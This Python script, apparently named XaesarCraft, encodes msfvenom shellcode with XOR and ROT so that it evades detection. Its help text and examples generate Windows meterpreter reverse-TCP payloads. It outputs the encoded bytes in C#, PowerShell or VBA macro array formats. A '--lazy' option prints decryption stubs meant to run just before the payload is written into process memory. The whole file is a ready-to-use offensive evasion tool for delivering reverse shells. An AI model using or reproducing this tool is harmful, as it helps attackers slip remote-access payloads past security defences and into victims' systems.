#!/usr/bin/env python3

import re
import sys
import fileinput
import argparse
import base64

def create_parser():
    description_text = """
XaesarCraft allows you to apply different operations (XOR, ROT13, or a combination of these algorithms - XOROT)
to byte arrays and get the results in various formats.

The input is expected to be the result of a payload generated by msfvenom in csharp or ps1 formats.
Additionally, XaesarCraft supports converting the payload into an array format suitable for VBA scripts."""

    epilog_text = """Example of usage:\n# Using XOROT with default keys (13 for ROT13;) and 0xfa for XOR) to process a payload generated by msfvenom 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py"""
        
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,description=description_text, epilog=epilog_text)
    parser.add_argument('-k', '--key', type=parse_hex_number, help='The key to use for XOR operation.')
    parser.add_argument('-m', '--mode', type=str, help='Mode of operation (xor, rot, xorot).', default='xorot')
    parser.add_argument('-i', '--input', type=str, help='Input string to process.')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode.')
    parser.add_argument('-e', '--examples', action='store_true', help='Show more examples of using XaesarCraft.')
    parser.add_argument('-l', '--lazy', action='store_true', help='Show decryption code (C#, ps1, VBA) for default mode(!)')
    parser.add_argument('--b64', action='store_true', help='Output in base64 encoding.')
    parser.add_argument('--vba', action='store_true', help='Output in VBA array format.')
    return parser

def examples():
    examples="""Examples:

# Using XOROT with default keys (13 for ROT13;) and 0xfa for XOR) to process a payload generated by msfvenom 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py 

# Using XOROT with default keys to process a payload generated by msfvenom and return result in VBA array for your macros
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py --vba

# Using only ROT13 with custom key (0x13) to process a payload generated by msfvenom 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f ps1 | python3 XaesarCraft.py -m rot -n 0x13
# Using XOROT with a custom key (0x13) to process a payload generated by msfvenom and retrun payload base64 encoded

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f csharp | python3 XaesarCraft.py -n 0x13 --b64

# Process an input string directly (e.g. a payload snippet), other keys aplies too
python3 XaesarCraft.py --input "[Byte[]] $buf = 0xf8,0xa5,0x6c,0x11,0xfc,0x05" """ 
    print(examples)
    sys.exit(0)

def lazy():
    decr_code = """Decryption codes for default mode only, best to use just before writing to process memory:
C#:
    byte xorValue = 0xfa; int rot = 13;
    for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(buf[i] ^ xorValue); }
    for (int i = 0; i < buf.Length; i++) { buf[i] = (byte)(((uint)buf[i] + rot)); }
PowerShell:
    $xorValue = 0xfa; $rot = 13; 
    for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = [byte]($buf[$i] -bxor $xorValue); }
    for ($i=0; $i -lt $buf.Length; $i++) { $buf[$i] = [byte](([uint32]$buf[$i] + $rot)); }
VBA:
    Dim xorValue As Byte: xorValue = &Hfa
    Dim rot As Integer: rot = 13
    For i = 0 To UBound(buf): buf(i) = buf(i) Xor xorValue: Next i
    For i = 0 To UBound(buf): buf(i) = (buf(i) + rot) Mod 256: Next i"""
    print(decr_code)
    sys.exit(0)

def parse_hex_number(hex_string):
    try:
        return int(hex_string, 0)
    except ValueError:
        return None

def decrease_bytes(bytes_list, number=13):
    result = []
    for i, byte in enumerate(bytes_list):
        value = int(byte, 16)
        value = (value - number) % 256   
        hex_value = hex(value).replace('0x', '0x')
        result.append(hex_value if len(hex_value) > 3 else hex_value[:2] + hex_value[2:].zfill(2))
    return result

def extract_bytes(input_string):
    return re.findall(r'0x[0-9a-fA-F]{2}', input_string)

def xor_bytes(bytes_list, number=0xfa):
    result = []
    for hex_str in bytes_list:
        value = int(hex_str, 16)
        value = value ^ number   
        hex_value = hex(value).replace('0x', '0x')
        result.append(hex_value if len(hex_value) > 3 else hex_value[:2] + hex_value[2:].zfill(2))
    return result

def format_output(input_string, processed_bytes, vba=False, b64=False):
    result = ""
    if vba:
        int_bytes = [str(int(byte, 16)) for byte in processed_bytes]
        formatted_bytes = [', '.join(map(str, int_bytes[i:i+42])) for i in range(0, len(int_bytes), 42)]
        result = "buf = Array({})".format(', _\n'.join(formatted_bytes))
    elif "Byte" in input_string:
        result = "[Byte[]] $buf = " + ','.join(processed_bytes)
    elif "byte" in input_string:
        result = "byte[] buf = new byte[{}] {{{}}};".format(len(processed_bytes), ','.join(processed_bytes))
    else:
        return "Unknown format"
    if b64:
        result = base64.b64encode(result.encode()).decode()
    return result

def main():
    parser = create_parser()
    args = parser.parse_args()

    if args.examples:
        examples()
    if args.lazy:
        lazy()

    raw_input_string = ""
    if args.input:
        raw_input_string = args.input
    else:
        for line in sys.stdin:
            raw_input_string += line
    
    input_string = raw_input_string.replace('\n', '').replace('\\n', '')

    if args.debug:
        print(f"[Debug] {input_string}")
    bytes_list = extract_bytes(input_string)
    if args.mode == 'xor':
        if args.key is None: 
            processed_bytes = xor_bytes(bytes_list)
        else:
            number = args.key 
            processed_bytes = xor_bytes(bytes_list, number)
    elif args.mode == 'rot':
        if args.key is None: 
            processed_bytes = decrease_bytes(bytes_list)
        else:
            number = args.key 
            processed_bytes = decrease_bytes(bytes_list, number)
    elif args.mode == 'xorot':
        if args.key is None: 
            processed_bytes_1 = decrease_bytes(bytes_list)
            processed_bytes = xor_bytes(processed_bytes_1)
        else:
            number = args.key 
            processed_bytes_1 = decrease_bytes(bytes_list, number)
            processed_bytes = xor_bytes(processed_bytes_1, number)

    if args.vba&args.b64:
        formatted_output = format_output(raw_input_string, processed_bytes,vba=True, b64=True)
    elif args.vba:
        formatted_output = format_output(raw_input_string, processed_bytes,vba=True)
    elif args.b64:
        formatted_output = format_output(raw_input_string, processed_bytes,b64=True)
    else:
        formatted_output = format_output(raw_input_string, processed_bytes)

    print(f"{formatted_output}")

if __name__ == "__main__":
    main()
